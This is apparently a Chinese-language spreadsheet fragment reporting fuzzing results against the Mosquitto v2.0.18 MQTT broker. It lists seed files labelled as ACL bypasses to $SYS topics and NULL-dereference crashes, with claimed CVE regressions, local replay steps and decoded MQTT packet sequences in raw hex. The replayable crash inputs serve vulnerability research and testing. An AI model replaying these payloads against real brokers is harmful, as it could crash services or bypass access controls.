          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B177" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C177" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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77" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:00c2 ===\u000a大小: 935B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MQTT请求序列(193B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=119 Topics=[''(零长度!QoS=1)] | raw_header=821f0077000001230d00152473686172\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=115B | raw_header=3588010013245359532f62726f6b6572\u000aMsg[3]: (不完整,21B) raw=30465263746573702f7410006a63ffff8000526331\u000a(尾部21B): 30465263746573702f7410006a63ffff8000526331</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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78">
      <c r="A178" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0141</t>
        </is>
      </c>
      <c r="B178" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C178" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(200B)\u000a4.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178" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0141 ===\u000a大小: 925B (报告+请求数据)\u000a请求数据: 200B\u000a\u000a---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MQTT请求序列(200B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000000100c1c10103\u000aMsg[2]: TYPE0  | raw_header=00144141414141414141414141414141\u000aMsg[3]: PUBCOMP PacketID=14651 | raw_header=7402393b\u000aMsg[4]: TYPE0  | raw_header=00142473686172652f677270322f7365\u000aMsg[5]: (不完整,139B) raw=bda57b5b4620fb25e6791788bde37a26f99e7476c9284ee219c15794763a3933dfb48e25d5040066\u000a(尾部139B): bda57b5b4620fb25e6791788bde37a26f99e7476c9284ee219c15794763a3933dfb48e25d5040066736f722f2b2f74656d70</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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7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79">
      <c r="A179" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0143</t>
        </is>
      </c>
      <c r="B179" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C179" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(550B)\u000a4.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179" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0143 ===\u000a大小: 1422B (报告+请求数据)\u000a请求数据: 550B\u000a\u000a---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MQTT请求序列(550B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=e01300044d5154540402003c00725f73\u000aMsg[2]: PUBCOMP PacketID=1 | raw_header=7635000163820b00250006746573742f\u000aMsg[3]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=32353616000e617574685f646174615f\u000aMsg[4]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[5]: PUBREL PacketID=25860 | raw_header=642f6504ca10ed3f46dda0a3db953de4\u000aMsg[6]: AUTH  | raw_header=f706cfae571f9234\u000aMsg[7]: CONNACK  | raw_header=2800\u000aMsg[8]: TYPE0  | raw_header=06746573742f6300146461746161e71e\u000aMsg[9]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[10]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62726f6b65722f\u000aMsg[11]: TYPE0  | raw_header=00152473686172652f6772702f746573\u000aMsg[12]: (不完整,92B) raw=005bc341f6db2f5999341300044d515454ffff003c000766757a7a5f6337822a04c9000d24736f70\u000a(尾部92B): 005bc341f6db2f5999341300044d515454ffff003c000766757a7a5f6337822a04c9000d24736f7069630035400009612f62</f>
        <v/>
      </c>
      <c r="F1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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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7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0">
      <c r="A180" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:01c1</t>
        </is>
      </c>
      <c r="B180" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C180" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:4,cat:01c1)中的REQUEST DATA提取出来(189B)\u000a4.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180" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c1 ===\u000a大小: 1101B (报告+请求数据)\u000a请求数据: 189B\u000a\u000a---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MQTT请求序列(189B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1064 Topics=[''(零长度!QoS=0)] | raw_header=823b042800001c2473686172652f6733\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=0 retain=True payload_len=91B | raw_header=316f00122473686172652f677270312f\u000aMsg[3]: (不完整,15B) raw=01415b41a0ff7f000000012303ff05\u000a(尾部15B): 01415b41a0ff7f000000012303ff05</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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8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81">
      <c r="A181" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:01c2</t>
        </is>
      </c>
      <c r="B181" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C181" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(91B)\u000a4.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0x01c2\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E181" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c2 ===\u000a大小: 1223B (报告+请求数据)\u000a请求数据: 91B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev1】MQTT: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MQTT请求序列(91B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v255 ClientID=''(0B) clean_session=True keepalive=60s Will=YES [自动清理会话] | raw_header=151300044d515454ffff003c00000000\u000aMsg[2]: SUBSCRIBE PacketID=1152 Topics=['$sharK/gr 1st'(QoS=3)] | raw_header=822a0480000d24736861724b2f677220\u000aMsg[3]: (不完整,26B) raw=ae571f92340ee1057465732264617461eb000100a200096111bc\u000a(尾部26B): ae571f92340ee1057465732264617461eb000100a200096111bc</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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2">
      <c r="A182" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:01c3</t>
        </is>
      </c>
      <c r="B182" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C182" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:4,cat:01c3)中的REQUEST DATA提取出来(763B)\u000a4.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182" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:01c3 ===\u000a大小: 1821B (报告+请求数据)\u000a请求数据: 763B\u000a\u000a---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MQTT请求序列(763B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=65280 Topics=[''(零长度!QoS=0), '\x00\x00'(QoS=0)] | raw_header=820bff00000000000200006402\u000aMsg[2]: TYPE0  | raw_header=0029000766757a7a5f63338239005a00\u000aMsg[3]: PUBCOMP PacketID=8961 | raw_header=722f230100686172652f6772702f7465\u000aMsg[4]: PUBREL PacketID=25903 | raw_header=6172652f674343434343434343434343\u000aMsg[5]: SUBSCRIBE PacketID=90 Topics=[] | raw_header=8239005a00434343cdcdcdcdcdcd822b\u000aMsg[6]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload='\x00 \x06\u000dÔ§ò¨\u00ad ú9\x9a&lt;A' | raw_header=3d240013245359532f62726f6b65722f\u000aMsg[7]: (不完整,445B) raw=cdcdcdcdcdcdcdcd677270322f73656e736f0001000000142473686172652f677270322f73656e73\u000a(尾部445B): cdcdcdcdcdcdcdcd677270322f73656e736f0001000000142473686172652f677270322f73656e736f99341300004d7f1c24</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J18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3">
      <c r="A183" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B183" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C183" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(28717B)\u000a4.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Sev4\u000a- 违规类别代码: 0x0244\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E183" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0244 ===\u000a大小: 9953B (报告+请求数据)\u000a请求数据: 28717B\u000a\u000a---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MQTT请求序列(28717B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=101340044a1a54546666666666666666\u000aMsg[2]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[3]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[4]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[5]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[6]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[7]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[8]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[9]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[10]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[11]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[12]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[13]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[14]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[15]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[16]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[17]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[18]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[19]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[20]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[21]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[22]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[23]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[24]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000aMsg[25]: PUBREL PacketID=26214 | raw_header=66666666666666666666666666666666\u000a(尾部5294B): 6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J18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8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84">
      <c r="A184" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B184" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C184" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(470B)\u000a4.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184" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0246 ===\u000a大小: 1504B (报告+请求数据)\u000a请求数据: 470B\u000a\u000a---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MQTT请求序列(470B原始二进制) ---\u000aMsg[1]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=144953230100142473686172657f2072\u000aMsg[2]: TYPE0  | raw_header=0766757a7a5f6333822a04c9000d2473\u000aMsg[3]: PUBREL PacketID=38269 | raw_header=6565957d656565656565656565656565\u000aMsg[4]: PINGREQ  | raw_header=c000\u000aMsg[5]: PUBREL  | raw_header=6400\u000aMsg[6]: PUBLISH Topic='test/qos2' QoS=2 retain=False payload='\x00\x03need_puRrel' | raw_header=34180009746573742f716f733200036e\u000aMsg[7]: PUBREC PacketID=3 | raw_header=50020003\u000aMsg[8]: PUBREL PacketID=3 | raw_header=62020003\u000aMsg[9]: PUBCOMP PacketID=3 | raw_header=70020003\u000aMsg[10]: UNSUBSCRIBE  | raw_header=a2110004000d746573742f7265746169\u000aMsg[11]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[12]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62726f6b65722f\u000aMsg[13]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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5">
      <c r="A185" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B185" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C185" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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85" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c4 ===\u000a大小: 777B (报告+请求数据)\u000a请求数据: 51B\u000a\u000a---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MQTT请求序列(51B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: TYPE0  | raw_header=0000\u000aMsg[3]: SUBSCRIBE PacketID=11 Topics=[''(零长度!QoS=2), ''(零长度!QoS=0), 'sensor/temp'(QoS=0)] | raw_header=8216000b000002000000000b73656e73\u000aMsg[4]: PUBLISH Topic='sensor/temp' QoS=1 retain=True payload='\x00\x0cÙvy' | raw_header=3312000b73656e736f722f74656d7000\u000aMsg[5]: TYPE0  | raw_header=0100\u000aMsg[6]: TYPE0  | raw_header=01</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J18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8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86">
      <c r="A186" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B186" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C186" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(444B)\u000a4.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86" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:02c6 ===\u000a大小: 1507B (报告+请求数据)\u000a请求数据: 444B\u000a\u000a---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MQTT请求序列(444B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0000\u000aMsg[2]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1464612b2f6461746102001426736861\u000aMsg[3]: PUBREC PacketID=627 | raw_header=540402736f72\u000aMsg[4]: CONNACK session_present=1 reason_code=53 | raw_header=2f2301352000152473686172252f6772\u000aMsg[5]: PUBLISH Topic='MQTT' QoS=1 retain=True payload='ÿ\x02QTT\x04\x02\x00&lt;\x00\x07fu' | raw_header=3b1300044d515454ff02515454040200\u000aMsg[6]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[7]: SUBSCRIBE PacketID=2 Topics=['test/retained'(QoS=0)] | raw_header=82120002000d746573742f7265746169\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=False payload='' | raw_header=341800657461696e65646b6565705f6d\u000aMsg[9]: PUBCOMP PacketID=29285 | raw_header=742f72657461696e6564003418000974\u000aMsg[10]: UNSUBSCRIBE  | raw_header=a2110004000d746573742f7265746169\u000aMsg[11]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[12]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62726f6b65722f\u000aMsg[13]: (不完整,13B) raw=215e49198e563208b969f7d400\u000a(尾部13B): 215e49198e563208b969f7d400</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J18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7">
      <c r="A187" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0345</t>
        </is>
      </c>
      <c r="B187" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C187" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:4,cat:0345)中的REQUEST DATA提取出来(6721B)\u000a4. 使用MQTT二进制协议回放工具连接到127.0.0.1:1883发送种子序列\u000a5. 分析服务器响应并验证协议安全属性违规\u000a\u000a【独立复现验证结果】(2026-06-21)\u000a- AFLNet Oracle: 检测到14个安全属性违规\u000a- 最大严重性级别: Sev4\u000a- 违规类别代码: 0x0345\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E187" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0345 ===\u000a大小: 6625B (报告+请求数据)\u000a请求数据: 6721B\u000a\u000a---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MQTT请求序列(6721B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=64 Topics=[''(零长度!QoS=3)] | raw_header=820b004000006b6b6b6b6b6b6b\u000aMsg[2]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[3]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[4]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[5]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[6]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[7]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[8]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[9]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[10]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[11]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b646b6b6b6b6b\u000aMsg[12]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[13]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[14]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[15]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[16]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[17]: PUBREL PacketID=27503 | raw_header=6b6b6b6f6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[18]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[19]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[20]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[21]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[22]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[23]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[24]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000aMsg[25]: PUBREL PacketID=27499 | raw_header=6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b\u000a(尾部1505B): 6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b6b</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J18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8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88">
      <c r="A188" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:0347</t>
        </is>
      </c>
      <c r="B188" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C188" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000008,sev:4,cat:0347)中的REQUEST DATA提取出来(742B)\u000a4.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0x0347\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E188" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:0347 ===\u000a大小: 1778B (报告+请求数据)\u000a请求数据: 742B\u000a\u000a---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MQTT请求序列(742B原始二进制) ---\u000aMsg[1]: DISCONNECT 断开连接 | raw_header=e01300044d5154540402803c69696969\u000aMsg[2]: PUBREL PacketID=26985 | raw_header=69696969696969696969696969696969\u000aMsg[3]: PUBREL PacketID=26985 | raw_header=6969696969696969696969000766ff7a\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=152473686172652f6772702f74657374\u000aMsg[6]: PUBREL PacketID=29743 | raw_header=6573742f736f733200036e6565ffffff\u000aMsg[7]: PUBREL PacketID=26482 | raw_header=652f6772702f746573742f7464706963\u000aMsg[8]: UNSUBSCRIBE  | raw_header=a21b0310000a746573742f746f706963\u000aMsg[9]: PUBCOMP PacketID=29285 | raw_header=742f72657461696e65646b6565705f6d\u000aMsg[10]: PUBCOMP PacketID=15 | raw_header=7002000f\u000aMsg[11]: UNSUBSCRIBE  | raw_header=a2110004000d746573742f7265746169\u000aMsg[12]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[13]: PUBLISH Topic='$SYS/br\x18\x00\u0009test/qos2' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62721800097465\u000aMsg[14]: (不完整,75B) raw=6f6172652f677270312f230200152473686172652f6772702f746573742f746470696300350d176d\u000a(尾部75B): 6f6172652f677270312f230200152473686172652f6772702f746573742f746470696300350d176d6237ef0b333a44c201d6</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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8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89">
      <c r="A189" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:4,cat:03c5</t>
        </is>
      </c>
      <c r="B189" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C189" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(1436B)\u000a4.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0x03c5\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E189" s="2">
        <f>== 种子标识: id:000008,sev:4,cat:03c5 ===\u000a大小: 2889B (报告+请求数据)\u000a请求数据: 1436B\u000a\u000a---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MQTT请求序列(1436B原始二进制) ---\u000aMsg[1]: PINGREQ  | raw_header=c000\u000aMsg[2]: TYPE0  | raw_header=00044d515454\u000aMsg[3]: TYPE0  | raw_header=0402003c\u000aMsg[4]: TYPE0  | raw_header=000766757a7a826333\u000aMsg[5]: SUBSCRIBE PacketID=90 Topics=['+/data'(QoS=0), '$share/grp2/sensor/#'(QoS=1), '$share/grp2/sensor/#'(QoS=3)] | raw_header=8239005a00062b2f646174610c001424\u000aMsg[6]: PUBLISH Topic='$share/grp/test/topic' QoS=2 retain=True payload='¦®ÃAöÛ/Y\x99' | raw_header=352000152473686172652f6772702f74\u000aMsg[7]: PUBLISH Topic='ÎQTT' QoS=2 retain=False payload='ÿÿ\x00&lt;\x00\x07fuzz_c3' | raw_header=34130004ce515454ffff003c00076675\u000aMsg[8]: PUBLISH Topic='?' QoS=1 retain=False payload='' | raw_header=322a04c9000d2473686172652f677270\u000aMsg[9]: PUBLISH Topic='a/b/c/d/e' QoS=2 retain=True payload_len=53B | raw_header=35400009612f622f632f642f65e2cf10\u000aMsg[10]: SUBACK PacketID=6 reason_codes=[116,101,115,116,47,99,0,20,100,97,116,97,97,231,0,52,162,27,3,16,0,10,116,101,115,116,47,116,111,112,105,99,0,11,115,101,110,115] | raw_header=94280006746573742f63001464617461\u000aMsg[11]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keNp_me' | 